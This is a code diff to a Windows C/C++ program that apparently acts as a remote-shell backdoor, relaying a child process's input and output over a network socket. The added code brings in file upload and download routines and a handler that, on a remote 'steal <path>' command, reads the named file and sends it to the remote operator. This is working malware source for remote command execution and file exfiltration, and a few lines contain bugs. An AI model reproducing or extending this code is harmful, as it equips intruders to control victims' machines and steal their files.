@@ -16,7 +16,7 @@ int interval;
 SOCKET m_socket;
 
 static const int BUFFER_SIZE = 16 * 1024;
-#define BUFSIZE 4096
+#define BUFSIZE 16 * 1024
 
 using std::string;
 
@@ -27,6 +27,71 @@ HANDLE g_hChildStd_IN_Wr = NULL;
 
 void WriteToPipe(string msg);
 char* ReadFromPipe(void);
+
+static void SendFile(const char * fileName)
+{
+	FILE * fpIn = fopen(fileName, "r");
+	char buf[BUFFER_SIZE];
+	while (1)
+	{
+		ssize_t bytesRead = fread(buf, 1, sizeof(buf), fpIn);
+		if (bytesRead <= 0) break;  // EOF
+		send(m_socket, buf, bytesRead, 0);
+	}
+}
+
+int ReceiveFile(int port, const char * fileName)
+{
+	int s = socket(AF_INET, SOCK_STREAM, 0);
+	if (s >= 0)
+	{
+#ifndef WIN32
+		// (Not necessary under windows -- it has the behaviour we want by default)
+		const int trueValue = 1;
+		(void)setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &trueValue, sizeof(trueValue));
+#endif
+
+		struct sockaddr_in saAddr; memset(&saAddr, 0, sizeof(saAddr));
+		saAddr.sin_family = AF_INET;
+		saAddr.sin_addr.s_addr = htonl(0);  // (IPADDR_ANY)
+		saAddr.sin_port = htons(port);
+
+		if ((bind(s, (struct sockaddr *) &saAddr, sizeof(saAddr)) == 0) && (listen(s, 10) == 0))
+		{
+			memset(&saAddr, 0, sizeof(saAddr));
+			socklen_t len = sizeof(saAddr);
+			int connectSocket = accept(s, (struct sockaddr *) &saAddr, &len);
+			if (connectSocket >= 0)
+			{
+				FILE * fpIn = fopen(fileName, "w");
+				if (fpIn)
+				{
+					char buf[BUFFER_SIZE];
+					while (1)
+					{
+						ssize_t bytesReceived = recv(connectSocket, buf, sizeof(buf), 0);
+						if (bytesReceived < 0) return 1;  // network error?
+						if (bytesReceived == 0) break;   // sender closed connection, must be end of file
+
+						if (fwrite(buf, 1, bytesReceived, fpIn) != (size_t)bytesReceived)
+						{
+							return 2; //file write error
+							break;
+						}
+					}
+
+					fclose(fpIn);
+				}
+				else return 2; //couldn't open file for writing
+				closesocket(connectSocket);
+			}
+		}
+		else return 3; //socket bind error
+		closesocket(s);
+		return 0; //success
+	}
+	else return 4; //socket error
+}
 
 int mainLoop() {
 	WSADATA wsaData;
@@ -57,8 +122,11 @@ int mainLoop() {
 	// Receives some test string to server...
 	while (true)
 	{
-		strcpy(sendbuf, ReadFromPipe());
+		while (sendbuf[strlen(sendbuf) - 1] != ">"[0]) {
+			strcpy(sendbuf, ReadFromPipe());
+		}
 		bytesSent = send(m_socket, sendbuf, strlen(sendbuf), 0);
+		sendbuf[0] = 0;
 
 		bytesRecv = recv(m_socket, recvbuf, 16000, 0);
 		if (bytesRecv == 0 || bytesRecv == WSAECONNRESET)
@@ -68,6 +136,12 @@ int mainLoop() {
 		if (bytesRecv < 0)
 			return 0;
 		else {
+			if (recvbuf == "exit") return 0;
+			if (strncmp(recvbuf, "steal", strlen("steal")) == 0) {
+				char path[16000];
+				memcpy(path, &recvbuf[6], strlen(recvbuf) - 7);
+				SendFile(path);
+			}
 			WriteToPipe(recvbuf);
 		}
 
@@ -142,20 +216,20 @@ void WriteToPipe(string msg)
 
 char* ReadFromPipe(void)
 {
-	DWORD total = 0;
-	DWORD dwRead, dwWritten;
+	DWORD numread = 0;
+	DWORD dwRead;
 	CHAR chBuf[BUFSIZE];
 	BOOL bSuccess = FALSE;
 	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
 	CHAR oldChBuf[BUFSIZE] = "";
 	for (;;)
 	{
-		PeekNamedPipe(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL, NULL);
-		if (strcmp(chBuf, oldChBuf) == 0) break;
-		total += dwRead;
 		Sleep(250);
+		PeekNamedPipe(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL, NULL);
+		numread = dwRead;
+		if (strcmp(chBuf, oldChBuf) == 0) break;
 		strcpy(oldChBuf, chBuf);
 	}
-	chBuf[total] = 0;
+	chBuf[numread] = 0;
 	return chBuf;
 }
